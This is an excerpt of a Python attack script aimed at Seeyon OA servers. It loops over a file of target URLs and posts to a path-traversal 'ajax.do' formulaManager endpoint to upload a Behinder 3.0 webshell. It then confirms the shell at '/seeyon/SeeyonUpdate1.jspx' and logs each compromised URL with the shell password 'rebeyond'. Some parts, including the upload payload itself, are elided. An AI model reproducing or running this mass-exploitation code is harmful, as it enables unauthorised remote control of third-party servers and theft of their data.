...
def seeyon_uplaod():
    ...
    #     f.readlines()
    f = open('urls.txt', 'r')
    path = open('sessyon_upload_ok.txt', 'a', encoding='utf-8')
    payload_path = "/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip"
    for target in f.readlines():
        ...
        # exp
        r = requests.post(url=url, data=data, timeout=5, headers=header, verify=False)
        # print(r.status_code)
        if r.status_code == 500:
            req1 = requests.get(url=target + '/seeyon/SeeyonUpdate1.jspx', headers=header, verify=False)
            if "java.lang.NullPointerException" in req1.text:
                print("[+] " + target + "冰蝎3.0马上传成功！")
                url1 = target + '/seeyon/SeeyonUpdate1.jspx'
                print("[!] " + url1 + " 密码:rebeyond")
                path.write(url1 + " 密码:rebeyond" + '\n')
